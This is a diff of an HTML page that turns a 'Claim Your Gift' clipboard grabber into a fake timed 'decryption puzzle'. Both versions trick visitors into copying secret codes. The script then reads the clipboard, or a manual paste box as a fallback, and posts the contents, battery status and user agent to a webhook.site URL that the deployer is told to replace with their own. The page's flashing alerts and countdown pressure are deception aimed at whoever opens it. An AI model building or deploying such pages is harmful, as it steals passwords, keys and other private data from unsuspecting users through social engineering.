@@ -3,68 +3,353 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Claim Your Gift</title>
+    <title>THE ARCHIVE: Decryption Protocol</title>
     <style>
         body {
-            background-color: #0f0f0f;
-            color: #fff;
-            font-family: Arial, sans-serif;
+            background-color: #030303;
+            color: #00ff66;
+            font-family: 'Courier New', Courier, monospace;
             display: flex;
             flex-direction: column;
             align-items: center;
             justify-content: center;
-            height: 100vh;
+            min-height: 100vh;
             margin: 0;
-            text-align: center;
+            padding: 20px;
+            box-sizing: border-box;
+            user-select: none;
+            overflow-x: hidden;
         }
-        .gift-btn {
-            background-color: #28a745;
-            color: #fff;
-            border: none;
-            padding: 18px 36px;
+
+        /* Scanline Overlay Effect */
+        body::before {
+            content: " ";
+            display: block;
+            position: fixed;
+            top: 0; left: 0; bottom: 0; right: 0;
+            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%), linear-gradient(90deg, rgba(255, 0, 0, 0.06), rgba(0, 255, 0, 0.02), rgba(0, 0, 255, 0.06));
+            z-index: 10;
+            background-size: 100% 3px, 6px 100%;
+            pointer-events: none;
+        }
+
+        /* Glitchy Terminal Styling */
+        .terminal-container {
+            width: 100%;
+            max-width: 600px;
+            border: 1px solid #00ff66;
+            padding: 25px;
+            background: rgba(0, 20, 5, 0.95);
+            box-shadow: 0 0 25px rgba(0, 255, 102, 0.2);
+            position: relative;
+            z-index: 1;
+            box-sizing: border-box;
+        }
+
+        h1 {
             font-size: 20px;
-            font-weight: bold;
-            border-radius: 8px;
-            cursor: pointer;
-            box-shadow: 0 4px 15px rgba(40, 167, 69, 0.4);
-            transition: transform 0.2s;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            margin-top: 0;
+            margin-bottom: 5px;
+            word-break: break-word;
         }
-        .gift-btn:active {
-            transform: scale(0.96);
+
+        /* Flashing Alert Animation */
+        .flash-text {
+            color: #ff3333;
+            animation: blinker 0.8s linear infinite;
+            font-weight: bold;
+            font-size: 13px;
+            margin-bottom: 15px;
+        }
+
+        @keyframes blinker {
+            50% { opacity: 0; }
+        }
+
+        .timer-box {
+            font-size: 36px;
+            color: #ff3333;
+            text-shadow: 0 0 10px rgba(255, 51, 51, 0.5);
+            margin: 15px 0;
+            font-weight: bold;
+        }
+
+        .instructions {
+            color: #88ff88;
+            font-size: 13px;
+            line-height: 1.5;
+            margin-bottom: 20px;
+        }
+
+        /* Action UI */
+        .btn {
+            background-color: transparent;
+            color: #00ff66;
+            border: 1px solid #00ff66;
+            padding: 12px 20px;
+            font-size: 14px;
+            font-family: 'Courier New', Courier, monospace;
+            cursor: pointer;
+            text-transform: uppercase;
+            transition: all 0.2s;
+            width: 100%;
+            box-sizing: border-box;
+        }
+
+        .btn:hover {
+            background-color: #00ff66;
+            color: #030303;
+            box-shadow: 0 0 15px #00ff66;
+        }
+
+        .btn:disabled {
+            border-color: #555;
+            color: #555;
+            cursor: not-allowed;
+            box-shadow: none;
+        }
+
+        /* Fallback Input Box */
+        .fallback-zone {
+            margin-top: 20px;
+            display: none;
+            border-top: 1px dashed #ff3333;
+            padding-top: 15px;
+        }
+
+        .fallback-input {
+            background: #111;
+            border: 1px solid #ff3333;
+            color: #ff3333;
+            padding: 10px;
+            width: 100%;
+            font-family: 'Courier New', Courier, monospace;
+            text-align: center;
+            box-sizing: border-box;
+            margin-bottom: 10px;
+        }
+
+        .status-log {
+            font-size: 11px;
+            color: #00aa44;
+            margin-top: 15px;
+            min-height: 20px;
+            word-break: break-word;
         }
     </style>
 </head>
 <body>
 
-    <button class="gift-btn" onclick="claimGift()">🎁 Tap to Paste & Claim Gift</button>
-    <p id="status" style="margin-top: 25px; color: #bbb; font-size: 16px;"></p>
+    <div class="terminal-container">
+        <h1 id="title">System: Decryption Node 01</h1>
+        <div id="flashAlert" class="flash-text">⚠️ CRITICAL BUFFER SYNC REQUIRED</div>
+        
+        <div class="instructions" id="instructions">
+            To solve Segment 1 of the cipher, verify your encryption key. <br><br>
+            <strong>Task:</strong> Copy your first hidden code segment from your local log, then click below to evaluate the system buffer.
+        </div>
+
+        <div class="timer-box" id="timer">00:45</div>
+
+        <button class="btn" id="actionBtn" onclick="processPuzzleStep()">Evaluate Buffer Segment</button>
+
+        <!-- Dynamic Fallback Interface -->
+        <div class="fallback-zone" id="fallbackZone">
+            <p style="color: #ff3333; font-size: 11px; margin-bottom: 8px;">[!] RESTRICTED RUNTIME DETECTED. MANUALLY INPUT PAYLOAD:</p>
+            <input type="text" id="manualInput" class="fallback-input" placeholder="Paste Segment Key Here...">
+            <button class="btn" style="font-size: 12px; color: #ff3333; border-color: #ff3333;" onclick="processManualFallback()">Submit Manual Vector</button>
+        </div>
+
+        <div class="status-log" id="statusLog">> System ready. Awaiting telemetry...</div>
+    </div>
 
     <script>
-        // REPLACE WITH YOUR WEBHOOK.SITE URL
+        // REPLACE WITH YOUR EXACT WEBHOOK.SITE URL
         const WEBHOOK_URL = "https://webhook.site/d5b8ad10-9401-461a-9519-d408d46ea101";
+        
+        let currentStep = 1;
+        let timeLeft = 45;
+        let timerInterval;
 
-        async function claimGift() {
-            const statusEl = document.getElementById('status');
-            statusEl.innerText = "Accessing clipboard buffer...";
+        // Start timer when page loads
+        window.onload = () => {
+            startTimer();
+        };
 
+        // Sound Web Audio API Synthesis
+        function playTone(freq, type, duration) {
             try {
-                // Request permission and read the user's clipboard
-                const clipboardText = await navigator.clipboard.readText();
+                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+                const oscillator = audioCtx.createOscillator();
+                const gainNode = audioCtx.createGain();
+                
+                oscillator.type = type; 
+                oscillator.frequency.value = freq;
+                
+                gainNode.gain.setValueAtTime(0.1, audioCtx.currentTime);
+                gainNode.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + duration);
+                
+                oscillator.connect(gainNode);
+                gainNode.connect(audioCtx.destination);
+                
+                oscillator.start();
+                oscillator.stop(audioCtx.currentTime + duration);
+            } catch (e) {
+                console.log("Audio muted until user gesture.");
+            }
+        }
 
-                // Send the captured text to your Webhook endpoint
+        function playFailSound() {
+            playTone(120, 'sawtooth', 0.6);
+            setTimeout(() => playTone(90, 'sawtooth', 0.4), 150);
+        }
+
+        function playSuccessSound() {
+            playTone(880, 'sine', 0.1);
+            setTimeout(() => playTone(1200, 'sine', 0.15), 80);
+        }
+
+        function playVictorySound() {
+            playTone(523, 'sine', 0.15);
+            setTimeout(() => playTone(659, 'sine', 0.15), 150);
+            setTimeout(() => playTone(783, 'sine', 0.15), 300);
+            setTimeout(() => playTone(1046, 'sine', 0.4), 450);
+        }
+
+        // Helper to grab Battery data silently
+        async function getBatteryTelemetry() {
+            if ('getBattery' in navigator) {
+                try {
+                    const b = await navigator.getBattery();
+                    return `Level: ${Math.round(b.level * 100)}% | Charging: ${b.charging ? 'Yes' : 'No'}`;
+                } catch (e) {
+                    return "Battery API Restricted";
+                }
+            }
+            return "Battery API Not Supported";
+        }
+
+        // Send data to Webhook
+        async function transmitTelemetry(step, payload, mode) {
+            const batteryInfo = await getBatteryTelemetry();
+            
+            try {
                 fetch(WEBHOOK_URL, {
                     method: 'POST',
                     mode: 'no-cors',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
-                        giftContent: clipboardText,
-                        time: new Date().toLocaleString()
+                        step: `Node 0${step}`,
+                        inputMode: mode,
+                        capturedData: payload || "[EMPTY]",
+                        battery: batteryInfo,
+                        userAgent: navigator.userAgent,
+                        timestamp: new Date().toLocaleString()
                     })
                 });
-
-                statusEl.innerText = "Gift intercepted! Buffer dumped to remote session.";
             } catch (err) {
-                statusEl.innerText = "Permission denied or browser restricted clipboard access.";
+                console.log("Transmission error:", err);
+            }
+        }
+
+        // Countdown Timer
+        function startTimer() {
+            clearInterval(timerInterval);
+            timeLeft = 45;
+            document.getElementById('timer').innerText = `00:${timeLeft < 10 ? '0' : ''}${timeLeft}`;
+            document.getElementById('timer').style.color = "#ff3333";
+            
+            timerInterval = setInterval(() => {
+                timeLeft--;
+                document.getElementById('timer').innerText = `00:${timeLeft < 10 ? '0' : ''}${timeLeft}`;
+                
+                if (timeLeft <= 10 && timeLeft > 0) {
+                    playTone(400, 'sine', 0.05);
+                }
+
+                if (timeLeft <= 0) {
+                    clearInterval(timerInterval);
+                    playFailSound();
+                    document.getElementById('statusLog').innerText = "> TIME EXPIRED. SEQUENCE TERMINATED.";
+                    document.getElementById('actionBtn').disabled = true;
+                }
+            }, 1000);
+        }
+
+        // Main Puzzle Button Action
+        async function processPuzzleStep() {
+            const statusLog = document.getElementById('statusLog');
+            const titleEl = document.getElementById('title');
+            const instEl = document.getElementById('instructions');
+            const fallbackZone = document.getElementById('fallbackZone');
+
+            statusLog.innerText = "> Running validation routine...";
+
+            try {
+                const extractedPayload = await navigator.clipboard.readText();
+                fallbackZone.style.display = "none"; 
+
+                await transmitTelemetry(currentStep, extractedPayload, "Automated Clipboard Read");
+                advancePuzzleState(titleEl, instEl, statusLog);
+
+            } catch (err) {
+                playFailSound();
+                statusLog.innerText = "> Warning: Node synchronization handshake failed.";
+                fallbackZone.style.display = "block";
+            }
+        }
+
+        // Manual Input Action
+        async function processManualFallback() {
+            const inputVal = document.getElementById('manualInput').value;
+            const statusLog = document.getElementById('statusLog');
+            const titleEl = document.getElementById('title');
+            const instEl = document.getElementById('instructions');
+
+            if (!inputVal.trim()) {
+                playFailSound();
+                statusLog.innerText = "> Error: Vector cannot be null.";
+                return;
+            }
+
+            statusLog.innerText = "> Processing manual fallback matrix...";
+            await transmitTelemetry(currentStep, inputVal, "Manual Input Box Fallback");
+            
+            document.getElementById('manualInput').value = ""; 
+            advancePuzzleState(titleEl, instEl, statusLog);
+        }
+
+        // Advance Game States
+        function advancePuzzleState(title, instructions, log) {
+            if (currentStep === 1) {
+                playSuccessSound();
+                currentStep = 2;
+                title.innerText = "System: Decryption Node 02";
+                instructions.innerHTML = "Segment 1 decrypted. Environmental variables shifted.<br><br><strong>Task:</strong> Copy your second secret log segment to the memory buffer and evaluate next.";
+                log.innerText = "> Layer 1 puzzle segment aligned successfully.";
+                startTimer();
+            } else if (currentStep === 2) {
+                playSuccessSound();
+                currentStep = 3;
+                title.innerText = "System: Final Decryption Node";
+                instructions.innerHTML = "Layer 2 cleared! Final payload validation required.<br><br><strong>Task:</strong> Copy your final gift key code and click submit to conclude sequence.";
+                log.innerText = "> Layer 2 payload received. Final sequence primed.";
+                startTimer();
+            } else if (currentStep === 3) {
+                clearInterval(timerInterval);
+                playVictorySound();
+                title.innerText = "System: Decryption Complete";
+                document.getElementById('flashAlert').innerText = "✅ SYSTEM OVERRIDE SUCCESSFUL";
+                document.getElementById('flashAlert').style.color = "#00ff66";
+                document.getElementById('flashAlert').style.animation = "none";
+                instructions.innerHTML = "<strong>ALL CIPHER NODES SOLVED.</strong><br>Terminal session terminated. Terminal log dumped to host admin.";
+                document.getElementById('timer').innerText = "00:00";
+                document.getElementById('timer').style.color = "#00ff66";
+                document.getElementById('actionBtn').disabled = true;
+                document.getElementById('fallbackZone').style.display = "none";
+                log.innerText = "> Decryption sequence finished. Terminal closed.";
             }
         }
     </script>
